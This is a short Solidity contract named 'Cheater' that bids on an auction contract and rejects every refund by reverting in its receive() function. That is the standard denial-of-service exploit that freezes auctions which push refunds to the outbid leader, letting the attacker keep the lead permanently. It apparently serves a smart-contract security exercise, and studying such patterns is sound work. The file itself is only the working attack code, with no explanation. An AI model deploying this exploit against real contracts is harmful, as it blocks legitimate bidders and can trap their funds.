// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IAuction {
    function bid() external payable;
}

contract Cheater {

    IAuction auction;

    constructor(IAuction _auction) {
        auction = IAuction(_auction);
    }

    function cheat() public payable {
        auction.bid{value: msg.value}();
    }

    receive() external payable {
        revert("Not accepting refunds.");
    }
}